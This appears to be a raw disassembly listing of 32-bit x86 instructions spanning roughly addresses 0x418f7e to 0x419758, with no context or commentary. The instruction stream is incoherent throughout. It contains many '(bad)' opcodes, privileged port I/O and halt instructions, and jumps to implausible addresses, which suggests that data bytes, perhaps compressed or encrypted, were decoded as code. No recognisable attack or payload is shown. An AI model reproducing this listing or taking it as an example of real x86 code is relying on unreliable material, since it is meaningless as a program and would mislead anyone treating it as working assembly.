  418f7e:	fmul   DWORD PTR [esi+ecx*1+0x59]
  418f82:	dec    ebp
  418f83:	xor    edx,DWORD PTR [edx-0x1f59f647]
  418f89:	and    al,0x2e
  418f8b:	push   esi
  418f8c:	sub    dh,ah
  418f8e:	jbe    0x418fff
  418f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f91:	or     DWORD PTR [edx+esi*2-0x45204991],0xffffff95
  418f99:	fst    QWORD PTR [eax+eiz*1+0x7f]
  418f9d:	iret   
  418f9e:	mov    ebx,0x5c0cfef0
  418fa3:	ss repz hlt 
  418fa6:	adc    al,BYTE PTR [ebp-0x2b9b5b41]
  418fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fad:	sti    
  418fae:	adc    esi,DWORD PTR [esi]
  418fb0:	xchg   esp,eax
  418fb1:	mov    bl,0x39
  418fb3:	sub    bh,BYTE PTR [ebp+0x13]
  418fb6:	ins    BYTE PTR es:[edi],dx
  418fb7:	sar    DWORD PTR [ebx-0x18],1
  418fba:	inc    eax
  418fbb:	pop    ebp
  418fbc:	jg     0x418f78
  418fbe:	pusha  
  418fbf:	sbb    BYTE PTR [esi],bl
  418fc1:	repnz cmp eax,0xee0c55ba
  418fc7:	adc    DWORD PTR [edi+0x2376ab50],edx
  418fcd:	jge    0x418f6d
  418fcf:	cmp    ch,BYTE PTR [edi+eiz*8+0x37b5a843]
  418fd6:	out    dx,al
  418fd7:	and    esp,ebx
  418fd9:	daa    
  418fda:	in     al,0x8b
  418fdc:	xor    eax,0x52
  418fdf:	push   ss
  418fe0:	mov    ebx,0x4dfdbd34
  418fe5:	add    DWORD PTR [ebx],0xba1ea280
  418feb:	push   0x42a39c5a
  418ff0:	sub    al,0x11
  418ff2:	xchg   BYTE PTR [edx],bl
  418ff4:	repnz sti 
  418ff6:	dec    ecx
  418ff7:	fimul  DWORD PTR [ebp+0x2e]
  418ffa:	mul    BYTE PTR [ecx+0x15a1f691]
  419000:	sbb    ecx,ebp
  419002:	fiadd  DWORD PTR [ebx]
  419004:	je     0x419058
  419006:	sbb    DWORD PTR [edi+0x5fac58fa],ebp
  41900c:	xchg   ebx,eax
  41900d:	push   eax
  41900e:	fucomi st,st(4)
  419010:	(bad)  
  419011:	push   ebp
  419012:	sub    al,dh
  419014:	aas    
  419015:	outs   dx,DWORD PTR ds:[esi]
  419016:	cmp    ch,BYTE PTR [eax-0x4360f905]
  41901c:	pop    ds
  41901d:	js     0x41902a
  41901f:	mov    DWORD PTR [eax+0x55616df5],eax
  419025:	mov    ebp,edx
  419027:	call   0x613f:0x6f9a2824
  41902e:	sahf   
  41902f:	rcr    BYTE PTR [edi-0x3b84ccd7],cl
  419035:	sbb    dh,BYTE PTR [ebx-0x34]
  419038:	mov    ebx,0x1e0ab432
  41903d:	test   DWORD PTR [ebp-0x68],0x65e185ba
  419044:	in     eax,dx
  419045:	out    0x46,eax
  419047:	shl    DWORD PTR [esi+edi*4],0xf5
  41904b:	sub    eax,0xcca6f9fc
  419050:	gs pop edx
  419052:	inc    ecx
  419053:	ins    DWORD PTR es:[edi],dx
  419054:	jns    0x418fee
  419056:	outs   dx,BYTE PTR ds:[esi]
  419057:	pusha  
  419058:	es push ds
  41905a:	sub    ch,ah
  41905c:	inc    DWORD PTR [eax+0x1c]
  41905f:	pop    esp
  419060:	pushf  
  419061:	in     al,dx
  419062:	int3   
  419063:	push   ss
  419064:	mov    WORD PTR [esi],?
  419066:	leave  
  419067:	in     eax,0xea
  419069:	sbb    BYTE PTR [edx-0x6c],bl
  41906c:	push   es
  41906d:	out    dx,eax
  41906e:	jae    0x41908d
  419070:	sub    BYTE PTR [ebp+edi*8+0x63],ch
  419074:	jns    0x4190c4
  419076:	dec    edx
  419077:	fist   DWORD PTR [ebp+0x41]
  41907a:	xchg   esp,eax
  41907b:	add    DWORD PTR [edx-0x1ceb3f6d],ebx
  419081:	xor    eax,0x768e3920
  419086:	std    
  419087:	sub    ebx,DWORD PTR [ebx]
  419089:	jno    0x41906c
  41908b:	stos   BYTE PTR es:[edi],al
  41908c:	js     0x4190a5
  41908e:	fld    DWORD PTR [edx-0x3f97b3ed]
  419094:	jecxz  0x419028
  419096:	jge    0x419102
  419098:	cmp    al,BYTE PTR [edi-0x5e]
  41909b:	dec    ebx
  41909c:	jno    0x4190f7
  41909e:	mov    bl,0xc7
  4190a0:	inc    ebp
  4190a1:	xchg   esi,eax
  4190a2:	mov    dl,0x7b
  4190a4:	adc    esi,DWORD PTR [edx+ecx*2+0x79f9895e]
  4190ab:	mov    ecx,0x8135c663
  4190b0:	dec    edi
  4190b1:	ficomp WORD PTR [edi-0x75eddf1b]
  4190b7:	mov    ebp,0xc03c7ea
  4190bc:	mov    al,0xbd
  4190be:	adc    eax,0xd3f2bcec
  4190c3:	pop    ss
  4190c4:	xor    dl,ch
  4190c6:	pop    esp
  4190c7:	fcmovnb st,st(4)
  4190c9:	js     0x4190b3
  4190cb:	pop    ebp
  4190cc:	mov    bl,0xfd
  4190ce:	rol    DWORD PTR [esi],0x3d
  4190d1:	inc    edx
  4190d2:	scas   eax,DWORD PTR es:[edi]
  4190d3:	mul    DWORD PTR [ebp+0x75]
  4190d6:	fld    DWORD PTR [esi-0x3b]
  4190d9:	jo     0x419135
  4190db:	pop    ebp
  4190dc:	clc    
  4190dd:	repnz fisttp WORD PTR ds:0xe4bd7be7
  4190e4:	xchg   edi,eax
  4190e5:	push   eax
  4190e6:	adc    esp,eax
  4190e8:	push   esp
  4190e9:	(bad)  
  4190eb:	aas    
  4190ec:	test   eax,0x8cbcc464
  4190f1:	loopne 0x4190dc
  4190f3:	fs scas eax,DWORD PTR es:[edi]
  4190f5:	mul    BYTE PTR [edx]
  4190f7:	les    ebx,FWORD PTR [edi+0x7f]
  4190fa:	ja     0x419163
  4190fc:	inc    eax
  4190fd:	(bad)
  419101:	cld    
  419102:	or     al,0xa4
  419104:	and    eax,0x48de2942
  419109:	jle    0x4190eb
  41910b:	and    BYTE PTR [esi-0x48],cl
  41910e:	mov    dl,0x36
  419110:	mov    ah,0xed
  419112:	inc    eax
  419113:	mov    ecx,0xdf0b2c44
  419118:	push   edi
  419119:	adc    ch,BYTE PTR ds:0x9c0d2348
  41911f:	mov    bl,0xcc
  419121:	test   al,0x6b
  419123:	lahf   
  419124:	mov    edx,DWORD PTR [edx-0x6c963e32]
  41912a:	sub    ch,BYTE PTR [ecx]
  41912c:	aad    0x2d
  41912e:	call   0xc09d5c70
  419133:	sti    
  419134:	repz sub ebp,DWORD PTR [esp+edi*2]
  419138:	push   es
  419139:	out    dx,eax
  41913a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41913b:	jmp    0xdd7d1162
  419140:	rcr    DWORD PTR [ebx-0x3aeacb86],cl
  419146:	mov    ecx,gs
  419148:	clc    
  419149:	hlt    
  41914a:	or     eax,0xa92fa158
  41914f:	out    0xf8,al
  419151:	mov    ds:0xa9c05892,eax
  419156:	jne    0x419139
  419158:	mov    gs,WORD PTR [ecx-0x13]
  41915b:	bound  esp,QWORD PTR [eax]
  41915d:	je     0x41917f
  41915f:	push   ss
  419160:	and    ecx,ecx
  419162:	xchg   ebx,eax
  419163:	jne    0x4191b3
  419165:	mov    esi,0xdb9b2c12
  41916a:	nop
  41916b:	fist   WORD PTR [ebx-0x243dd5e3]
  419171:	ja     0x419121
  419173:	pop    ebp
  419174:	dec    esi
  419175:	mov    al,0x5b
  419177:	xchg   BYTE PTR ds:0xf2d2cc2d,ch
  41917d:	js     0x4191fa
  41917f:	cwde   
  419180:	xchg   edi,eax
  419181:	mov    ebp,0xcb254ca6
  419186:	cdq    
  419187:	jb     0x419165
  419189:	push   esi
  41918a:	mov    DWORD PTR [edx+0x589f843c],esp
  419190:	push   ecx
  419191:	dec    ecx
  419192:	jecxz  0x41912e
  419194:	cmp    DWORD PTR [edx-0x6dd0bde7],edx
  41919a:	shl    edx,cl
  41919c:	scas   al,BYTE PTR es:[edi]
  41919d:	adc    al,0x27
  41919f:	bound  ebx,QWORD PTR [edi-0x27]
  4191a2:	sub    eax,0x31a825f6
  4191a7:	cwde   
  4191a8:	retf   0x195f
  4191ab:	das    
  4191ac:	dec    ebx
  4191ad:	push   eax
  4191ae:	mov    ch,0xf7
  4191b0:	mov    dl,0xd2
  4191b2:	mov    dh,0x1
  4191b4:	popf   
  4191b5:	loopne 0x4191d6
  4191b7:	mov    al,0xff
  4191b9:	sub    al,BYTE PTR [eax-0x38]
  4191bc:	mov    esi,0x1fa7dca9
  4191c1:	inc    ecx
  4191c2:	dec    esp
  4191c3:	fs fwait
  4191c5:	int    0x23
  4191c7:	jno    0x41923c
  4191c9:	sbb    BYTE PTR [ecx+0x2],ah
  4191cc:	(bad)  
  4191cd:	or     dh,bh
  4191cf:	aaa    
  4191d0:	mov    edx,0x9d5644eb
  4191d5:	and    edi,DWORD PTR [ecx]
  4191d7:	xchg   ecx,eax
  4191d8:	dec    edx
  4191d9:	mov    edx,0xd4abff4d
  4191de:	inc    edx
  4191df:	sbb    eax,0xf6228e10
  4191e4:	push   edx
  4191e5:	push   0xae3de97c
  4191ea:	out    0x82,eax
  4191ec:	ja     0x419211
  4191ee:	addr16 in al,0xe5
  4191f1:	dec    ebx
  4191f2:	pop    esp
  4191f3:	push   ecx
  4191f4:	fs sub al,0x9a
  4191f7:	fimul  DWORD PTR [ebx-0xf]
  4191fa:	cmp    esi,0xaee7c8ca
  419200:	ds jnp 0x419228
  419203:	call   DWORD PTR [edx]
  419205:	fsub   DWORD PTR [ebx+edi*8+0x65]
  419209:	sar    esp,1
  41920b:	jecxz  0x419259
  41920d:	shr    DWORD PTR [ebx-0x68],cl
  419210:	dec    ebp
  419211:	or     eax,0x6c2c3db
  419216:	les    edx,FWORD PTR [ecx-0x33]
  419219:	xchg   ebp,eax
  41921a:	inc    ebx
  41921b:	into   
  41921c:	xchg   dl,dh
  41921e:	dec    edi
  41921f:	add    DWORD PTR [edx+0x6c54914b],edx
  419225:	push   ebx
  419226:	(bad)  
  419228:	sub    eax,0x83f27e2e
  41922d:	adc    ebx,DWORD PTR [esi+0x22]
  419230:	push   eax
  419231:	push   cs
  419232:	adc    DWORD PTR [edx-0x16],ecx
  419235:	out    0x8f,eax
  419237:	or     al,0x69
  419239:	sub    dl,bh
  41923b:	lods   eax,DWORD PTR ds:[esi]
  41923c:	xchg   ebx,eax
  41923d:	cmp    eax,0xc6602643
  419242:	cld    
  419243:	push   edx
  419244:	fs pop ss
  419246:	jns    0x419222
  419248:	mov    dl,0x91
  41924a:	leave  
  41924b:	sub    eax,0x25502a2f
  419250:	js     0x41921e
  419252:	sbb    eax,0xd648351c
  419257:	mov    edx,DWORD PTR [edx+0x69]
  41925a:	xlat   BYTE PTR ds:[ebx]
  41925b:	dec    eax
  41925c:	popa   
  41925d:	(bad)  
  41925e:	(bad)  
  41925f:	add    al,0xb6
  419261:	jmp    0x41928c
  419263:	mov    ds:0x56958fe1,al
  419268:	xlat   BYTE PTR ds:[ebx]
  419269:	(bad)  
  41926a:	int    0x78
  41926c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41926d:	retf   
  41926e:	test   al,0x4a
  419270:	retf   0x4ed7
  419273:	pop    ds
  419274:	push   edx
  419275:	fild   WORD PTR ds:0x85bbb296
  41927b:	ins    BYTE PTR es:[edi],dx
  41927c:	add    dh,dh
  41927e:	xchg   edi,eax
  41927f:	sbb    DWORD PTR [edi+0x35],0x38
  419283:	xor    eax,0x214e2c6e
  419288:	inc    esi
  419289:	xor    ecx,DWORD PTR [esi-0xa6ec338]
  41928f:	mov    DWORD PTR [edx],ebp
  419291:	inc    edi
  419292:	icebp  
  419293:	mov    ch,0x77
  419295:	sbb    BYTE PTR [ecx],0x18
  419298:	cmp    DWORD PTR [ebp+0x564050b],0x6f
  41929f:	or     eax,DWORD PTR [edx]
  4192a1:	in     al,dx
  4192a2:	outs   dx,BYTE PTR ds:[esi]
  4192a3:	mov    ch,0x6d
  4192a5:	fisttp WORD PTR [edx*1+0x2d07e741]
  4192ac:	sbb    DWORD PTR [esi+ebx*4-0x4f],0xffffffe4
  4192b1:	aaa    
  4192b2:	ja     0x419262
  4192b4:	adc    eax,0xf4f2e013
  4192b9:	mov    WORD PTR [ebx+0x4131721f],ss
  4192bf:	in     al,dx
  4192c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c1:	mov    dl,0x30
  4192c3:	push   esp
  4192c4:	mov    BYTE PTR [esi],ah
  4192c6:	inc    esi
  4192c7:	sbb    ch,cl
  4192c9:	sbb    ecx,ebp
  4192cb:	shl    DWORD PTR [ebx],cl
  4192cd:	popf   
  4192ce:	cli    
  4192cf:	scas   eax,DWORD PTR es:[edi]
  4192d0:	fs push es
  4192d2:	add    al,0x4e
  4192d4:	in     eax,dx
  4192d5:	cmp    BYTE PTR [ecx+0x27bc3705],dh
  4192db:	shl    BYTE PTR [eax+0x236921f3],cl
  4192e1:	aas    
  4192e2:	jecxz  0x4192e0
  4192e4:	iret   
  4192e5:	outs   dx,BYTE PTR ds:[esi]
  4192e6:	sub    ch,BYTE PTR [ecx+0x65795115]
  4192ec:	xchg   edi,eax
  4192ed:	js     0x419353
  4192ef:	fxam   
  4192f1:	fisttp QWORD PTR [ebx-0x12c63ab9]
  4192f7:	mov    bl,BYTE PTR [eax-0x1c]
  4192fa:	arpl   bx,bp
  4192fc:	pop    eax
  4192fd:	lea    esp,[eax+0x3a]
  419300:	push   ebx
  419301:	mov    BYTE PTR [ecx],bl
  419303:	pop    ss
  419304:	mov    BYTE PTR [ebx+0xc],cl
  419307:	xchg   edx,eax
  419308:	or     cl,BYTE PTR [edi]
  41930a:	mov    BYTE PTR [esi-0x55a8773b],al
  419310:	xchg   DWORD PTR [edi],ebp
  419312:	in     al,dx
  419313:	jmp    DWORD PTR [eax+0x43ed62fe]
  419319:	test   DWORD PTR [esi-0x16],esi
  41931c:	leave  
  41931d:	outs   dx,BYTE PTR cs:[esi]
  41931f:	xchg   esi,eax
  419320:	cmp    eax,0x514b8aa2
  419325:	cmp    al,0xcf
  419327:	stc    
  419328:	fs jmp 0x41937f
  41932b:	ficom  DWORD PTR [eiz*8-0x4eb1a600]
  419332:	mov    edi,0x72f083cb
  419337:	inc    eax
  419338:	sbb    DWORD PTR [edi],ebp
  41933a:	jmp    0xa2fa9349
  41933f:	mov    eax,0x1514d485
  419344:	loopne 0x419384
  419346:	and    ecx,DWORD PTR [ecx+0x69]
  419349:	mov    dl,0x68
  41934b:	jge    0x4193bd
  41934d:	mul    ecx
  41934f:	adc    DWORD PTR [eax+0x29],edx
  419352:	cld    
  419353:	pop    edi
  419354:	loop   0x4192ec
  419356:	lock fwait
  419358:	push   edi
  419359:	cmp    DWORD PTR [ebx],esp
  41935b:	sbb    esp,DWORD PTR [ebx-0x5e7a7287]
  419361:	adc    al,0xf1
  419363:	cmp    eax,0x884ee12e
  419368:	loopne 0x419312
  41936a:	push   ebx
  41936b:	push   edi
  41936c:	jae    0x419351
  41936e:	fnsave [ebx]
  419370:	jae    0x419354
  419372:	cdq    
  419373:	mov    ds:0x3364b3fe,eax
  419378:	mov    ch,0xed
  41937a:	leave  
  41937b:	test   al,0xa7
  41937d:	jb     0x419303
  41937f:	adc    edx,DWORD PTR [edi-0x38]
  419382:	pop    eax
  419383:	out    dx,al
  419384:	mov    edi,0xa87b3eae
  419389:	push   ss
  41938a:	adc    eax,0x3c0c2ba3
  41938f:	pushf  
  419390:	sbb    DWORD PTR [ecx+eax*1],edi
  419393:	sbb    DWORD PTR [ecx],ebx
  419395:	jl     0x419408
  419397:	jl     0x419369
  419399:	(bad)  [eax+0x58]
  41939c:	pop    ecx
  41939d:	loopne 0x419337
  41939f:	test   BYTE PTR [eax],al
  4193a1:	pop    esi
  4193a2:	sub    DWORD PTR [ebx-0x2d090374],0x17fc7edc
  4193ac:	inc    ebx
  4193ad:	pop    ss
  4193ae:	or     eax,0xc67f43f9
  4193b3:	jmp    0xd24f:0x110e6e58
  4193ba:	mov    ch,0xdd
  4193bc:	xchg   edx,eax
  4193bd:	fsubr  DWORD PTR [edi]
  4193bf:	or     eax,DWORD PTR [eax+edi*4-0x12]
  4193c3:	int    0x4a
  4193c5:	(bad)  
  4193c6:	add    ebx,DWORD PTR [esi-0x7f]
  4193c9:	call   DWORD PTR [ecx]
  4193cb:	mov    ah,0x72
  4193cd:	test   DWORD PTR ds:0x4e48040c,esp
  4193d3:	add    al,0x8b
  4193d5:	cld    
  4193d6:	std    
  4193d7:	or     esp,DWORD PTR [edx]
  4193d9:	sbb    al,0xde
  4193db:	neg    al
  4193dd:	or     DWORD PTR [edx+0x42f57013],edi
  4193e3:	clc    
  4193e4:	jno    0x4193d4
  4193e6:	mov    esp,0x5595a0f
  4193eb:	or     eax,0xb4574fda
  4193f0:	inc    eax
  4193f1:	aam    0x94
  4193f3:	retf   
  4193f4:	fs sbb al,0x1
  4193f7:	mov    ebp,0xf7d9d2b8
  4193fc:	shr    dl,1
  4193fe:	adc    DWORD PTR [eax-0x217dcf30],eax
  419404:	lods   eax,DWORD PTR ds:[esi]
  419405:	out    0xed,al
  419407:	fisttp QWORD PTR [edx+0x49]
  41940a:	sub    eax,0x5198568c
  41940f:	mov    bl,BYTE PTR [eax+edx*8+0x3dbe4350]
  419416:	ss xchg edi,eax
  419418:	cmp    eax,0x15224e4
  41941d:	inc    ebx
  41941e:	mov    eax,ds:0x2718928e
  419423:	(bad)  
  419424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419425:	and    BYTE PTR ss:[edx+0x70cc5c19],0x2b
  41942d:	test   DWORD PTR [ebp+0x65],ecx
  419430:	test   al,0x30
  419432:	loop   0x419427
  419434:	cmp    al,0x80
  419436:	sbb    ecx,DWORD PTR [ecx+0x36]
  419439:	popa   
  41943a:	xchg   DWORD PTR [ecx],eax
  41943c:	mov    eax,ds:0xd947c018
  419441:	scas   al,BYTE PTR es:[edi]
  419442:	and    ebp,ebx
  419444:	addr16 cld 
  419446:	pusha  
  419447:	pop    ebx
  419448:	mov    ebp,0xc0f848e9
  41944d:	lods   eax,DWORD PTR ds:[esi]
  41944e:	add    DWORD PTR [ecx+0x77],0x3b
  419452:	pop    es
  419453:	or     BYTE PTR [eax+0x70],cl
  419456:	test   al,0x53
  419458:	xor    edi,DWORD PTR [edi+0x7d7786ab]
  41945e:	outs   dx,BYTE PTR ds:[esi]
  41945f:	repnz xor BYTE PTR cs:[edi-0x18],0xcf
  419465:	sub    ecx,DWORD PTR [edi]
  419467:	fcomi  st,st(0)
  419469:	sub    edi,ecx
  41946b:	jecxz  0x4194e0
  41946d:	lods   eax,DWORD PTR ds:[esi]
  41946e:	cmp    eax,0x7ed3b92e
  419473:	pop    ebp
  419474:	out    dx,al
  419475:	ret    
  419476:	xchg   ebx,eax
  419477:	stos   BYTE PTR es:[edi],al
  419478:	jmp    0x419420
  41947a:	xchg   edi,eax
  41947b:	lea    edi,[ebx-0x61]
  41947e:	pop    ds
  41947f:	into   
  419480:	bound  esi,QWORD PTR [ecx]
  419482:	push   ds
  419483:	jl     0x4194cc
  419485:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  419487:	shl    ch,0x84
  41948a:	xchg   ecx,eax
  41948b:	jne    0x4194c0
  41948d:	push   0x3c
  41948f:	pop    edi
  419490:	movd   DWORD PTR [eax],mm7
  419493:	sti    
  419494:	jmp    0x900adcdc
  419499:	mov    eax,0xe1ed51d5
  41949e:	outs   dx,BYTE PTR ds:[esi]
  41949f:	jne    0x419505
  4194a1:	cmc    
  4194a2:	mov    esi,0x432a376d
  4194a7:	dec    esi
  4194a8:	loop   0x4194af
  4194aa:	mov    al,0x6b
  4194ac:	dec    ecx
  4194ad:	add    al,BYTE PTR [ebx]
  4194af:	cmp    DWORD PTR [esi-0xf],esi
  4194b2:	in     al,0xd1
  4194b4:	mov    al,ds:0xbd1b2ccb
  4194ba:	arpl   WORD PTR [ebp*1+0x245c62ca],ax
  4194c1:	mov    ch,0x8b
  4194c3:	fwait
  4194c4:	mov    eax,ds:0x22a4881e
  4194c9:	faddp  st(6),st
  4194cb:	ins    DWORD PTR es:[edi],dx
  4194cc:	jmp    0x4194ea
  4194ce:	jge    0x419483
  4194d0:	lods   al,BYTE PTR ds:[esi]
  4194d1:	(bad)  
  4194d2:	je     0x419455
  4194d4:	ror    BYTE PTR [edx+0x3b69bf32],0xad
  4194db:	push   edx
  4194dc:	pop    ds
  4194dd:	ret    
  4194de:	lahf   
  4194df:	lock stc 
  4194e1:	cmp    DWORD PTR [edi-0x590549b9],esp
  4194e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e8:	mov    BYTE PTR [eax],ch
  4194ea:	sub    al,0x69
  4194ec:	test   eax,0x6a9b32f7
  4194f1:	ret    
  4194f2:	mov    dl,0x3f
  4194f4:	out    0x0,al
  4194f6:	sub    eax,edi
  4194f8:	ins    DWORD PTR es:[edi],dx
  4194f9:	into   
  4194fa:	add    al,BYTE PTR [ebx]
  4194fc:	push   ecx
  4194fd:	cld    
  4194fe:	push   ebp
  4194ff:	sbb    dl,cl
  419501:	mov    ecx,0x4f513d9b
  419506:	idiv   BYTE PTR ds:0x3393b216
  41950c:	test   BYTE PTR [ebx+0x4086ea22],ch
  419512:	sub    esi,edx
  419514:	mul    ebp
  419516:	icebp  
  419517:	mov    edi,0x7fbff608
  41951c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41951d:	iret   
  41951e:	pusha  
  41951f:	jns    0x419537
  419521:	js     0x4194d1
  419523:	rol    BYTE PTR [ecx+0x49433e3d],0x74
  41952a:	aam    0x90
  41952c:	pop    edx
  41952d:	iret   
  41952e:	pop    ebx
  41952f:	shl    DWORD PTR [eax-0x4f],1
  419532:	addr16 xchg esi,eax
  419534:	(bad)  
  419535:	lahf   
  419536:	dec    edx
  419537:	je     0x41951e
  419539:	addr16 (bad) 
  41953b:	aam    0x9
  41953d:	xchg   ebp,eax
  41953e:	jmp    0x36f8dc76
  419543:	jae    0x4194e9
  419545:	add    ebx,eax
  419547:	or     BYTE PTR [ebx],ah
  419549:	repz in eax,0xac
  41954c:	mov    eax,ds:0x4bd0935e
  419551:	out    0x8a,eax
  419553:	sbb    al,0x23
  419555:	xor    ebx,ebp
  419557:	sahf   
  419558:	mov    ch,0x9f
  41955a:	in     eax,0x40
  41955c:	lea    ebp,[eax]
  41955e:	mov    al,ds:0x731fa6be
  419563:	mov    ch,0x56
  419565:	sub    al,0xff
  419567:	test   BYTE PTR [ebx-0x62],dl
  41956a:	inc    ecx
  41956b:	pop    ss
  41956c:	mov    ebx,0x4cebe54c
  419571:	(bad)  
  419572:	test   dh,0xb3
  419575:	dec    edx
  419576:	dec    esi
  419577:	imul   ecx,DWORD PTR [edi+0x47],0x89cc32ab
  41957e:	mov    al,ds:0xa3f7bfe3
  419583:	mov    BYTE PTR [ebx-0x115ea1c2],0x7f
  41958a:	shl    ch,cl
  41958c:	gs push ecx
  41958e:	setp   dh
  419591:	shl    BYTE PTR [edx],1
  419593:	mov    ah,0x80
  419595:	mov    al,0xad
  419597:	icebp  
  419598:	add    esi,esp
  41959a:	inc    ecx
  41959b:	aas    
  41959c:	fnstsw WORD PTR [esi-0x22]
  41959f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195a0:	sub    eax,0x9c952cea
  4195a5:	mov    ebp,gs
  4195a7:	js     0x41957c
  4195a9:	pop    ss
  4195aa:	sbb    ch,BYTE PTR [ebx+0x5a]
  4195ad:	mov    esp,0xb0de8524
  4195b2:	xor    al,0x7c
  4195b4:	iret   
  4195b5:	test   BYTE PTR [edi],bh
  4195b7:	pop    ebx
  4195b8:	(bad)  
  4195b9:	loop   0x41957a
  4195bb:	out    dx,al
  4195bc:	adc    BYTE PTR [ecx],ah
  4195be:	inc    ecx
  4195bf:	pop    esp
  4195c0:	xchg   esp,eax
  4195c1:	es jnp 0x419605
  4195c4:	mov    dl,cl
  4195c6:	jle    0x4195fd
  4195c8:	loopne 0x419554
  4195ca:	sub    eax,0x7e2bb144
  4195cf:	mov    bl,0xa7
  4195d1:	outs   dx,DWORD PTR ds:[esi]
  4195d2:	je     0x419597
  4195d4:	test   eax,0x6b2c3837
  4195d9:	xor    bh,dh
  4195db:	sbb    dh,BYTE PTR [eax-0xa2c0b20]
  4195e1:	in     al,0x3a
  4195e3:	pop    ebp
  4195e4:	lods   eax,DWORD PTR ds:[esi]
  4195e5:	test   DWORD PTR [edx+0x75],0xe9b684d
  4195ec:	sub    DWORD PTR [eax+0x3],ecx
  4195ef:	mov    WORD PTR [eax+0x1582874c],es
  4195f5:	(bad)  
  4195f6:	sub    bh,cl
  4195f8:	sub    ch,ah
  4195fa:	push   ds
  4195fb:	sbb    al,0xf9
  4195fd:	popf   
  4195fe:	mov    al,ds:0x37acb544
  419603:	ss pop ecx
  419605:	push   cs
  419606:	dec    edx
  419607:	mov    ecx,0xc42093a4
  41960c:	mov    DWORD PTR ds:0xa5854726,esp
  419612:	shr    BYTE PTR [eax],0x5
  419615:	fdiv   QWORD PTR [ebp+0x538cc64e]
  41961b:	test   eax,0xb3ad405d
  419620:	xor    edx,DWORD PTR gs:[edi]
  419623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419624:	cmp    ebp,DWORD PTR [eax+0x6c]
  419627:	or     esp,DWORD PTR [ecx+ebp*8-0x41]
  41962b:	adc    BYTE PTR [esp+edx*1-0x70],dh
  41962f:	xor    eax,0xe899ef3e
  419634:	adc    DWORD PTR [ebx+0x5d],esi
  419637:	xlat   BYTE PTR ds:[ebx]
  419638:	addr16 fs (bad) 
  41963b:	cmp    eax,0x1208214f
  419640:	push   edi
  419641:	popf   
  419642:	cdq    
  419643:	test   BYTE PTR ss:[edi+0x60c29285],al
  41964a:	outs   dx,BYTE PTR ds:[esi]
  41964b:	xor    DWORD PTR [ebx-0x32],edx
  41964e:	mov    dl,0x7
  419650:	rol    DWORD PTR [edx+0x9],0xdd
  419654:	mov    eax,0xf5485358
  419659:	mov    al,0x30
  41965b:	push   cs
  41965c:	daa    
  41965d:	xchg   DWORD PTR [esp+edx*2-0x4a],eax
  419661:	or     al,BYTE PTR [edx]
  419663:	mov    DWORD PTR [edi-0x441cf6f7],ecx
  419669:	mov    dh,0x5c
  41966b:	mov    ebp,0x50dca21
  419670:	adc    DWORD PTR [ebx+ebp*1],ebx
  419673:	cmp    DWORD PTR [ecx-0x4b],edi
  419676:	or     eax,esi
  419678:	sbb    ebx,DWORD PTR [ebp-0x75433b93]
  41967e:	push   ss
  41967f:	push   0xffffffea
  419681:	test   DWORD PTR [esi-0x55],0x16677a2f
  419688:	pop    eax
  419689:	jmp    0x4196ae
  41968b:	sar    BYTE PTR [eax-0xa925d58],0xc1
  419692:	add    DWORD PTR [esi+0x4ea006c3],ebp
  419698:	sbb    al,0x2b
  41969a:	mov    dl,0x8a
  41969c:	dec    ebx
  41969d:	(bad)  
  41969e:	cmp    cl,ah
  4196a0:	inc    esp
  4196a1:	sbb    DWORD PTR [edi+0x2d],edx
  4196a4:	add    eax,0x1303c812
  4196a9:	add    edx,DWORD PTR [ebp-0x56]
  4196ac:	mov    ch,0x2
  4196ae:	jns    0x41963c
  4196b0:	mov    ebx,0x732464cb
  4196b5:	in     eax,dx
  4196b6:	pushf  
  4196b7:	fadd   st(4),st
  4196b9:	sbb    DWORD PTR [eax-0x2f97d0fd],0xffffffd5
  4196c0:	out    dx,eax
  4196c1:	pop    eax
  4196c2:	test   eax,0x77fbd555
  4196c7:	rcr    DWORD PTR [eax+0x20],1
  4196ca:	cdq    
  4196cb:	ss xchg edx,eax
  4196cd:	ds lahf 
  4196cf:	jle    0x4196ea
  4196d1:	ret    0x4b48
  4196d4:	hlt    
  4196d5:	mov    ecx,0x7ad124ba
  4196da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196db:	call   0x5478fb9d
  4196e0:	out    dx,al
  4196e1:	adc    dh,BYTE PTR [edx]
  4196e3:	out    dx,al
  4196e4:	in     al,0xdc
  4196e6:	loope  0x4196df
  4196e8:	loope  0x4196ec
  4196ea:	jns    0x41974f
  4196ec:	push   cs
  4196ed:	push   ebp
  4196ee:	pop    ebx
  4196ef:	add    edx,DWORD PTR [edx+0x6668cd54]
  4196f5:	sahf   
  4196f6:	pop    ds
  4196f7:	mov    DWORD PTR [ecx-0x7326afff],edi
  4196fd:	retf   0x9649
  419700:	mov    ebx,0x1e8a9560
  419705:	mov    edx,0x82538b40
  41970a:	out    0x6a,eax
  41970c:	or     al,0x51
  41970e:	(bad)  
  41970f:	cld    
  419710:	iret   
  419711:	push   eax
  419712:	add    esi,ebx
  419714:	push   0x2
  419716:	add    al,bl
  419718:	out    dx,al
  419719:	fsincos 
  41971b:	push   cs
  41971c:	adc    edx,esp
  41971e:	mov    BYTE PTR [edi+0x27a4b152],0x40
  419725:	jmp    0x419761
  419727:	mov    bl,bh
  419729:	mov    ds:0x8b742320,al
  41972e:	xor    al,0x6f
  419730:	pop    ecx
  419731:	cs in  al,0x67
  419734:	or     DWORD PTR ds:0xf136b813,ecx
  41973a:	shr    BYTE PTR [eax],1
  41973c:	mov    edx,0x9c31b11d
  419741:	or     BYTE PTR [edx],bl
  419743:	push   esp
  419744:	stos   DWORD PTR es:[edi],eax
  419745:	ret    0x30de
  419748:	mov    DWORD PTR ds:[eax],ecx
  41974b:	jecxz  0x4196cf
  41974d:	test   BYTE PTR [eax-0x2b72196c],bl
  419753:	repz fcmovnbe st,st(7)
  419756:	int3   
  419757:	push   esi
  419758:	nop
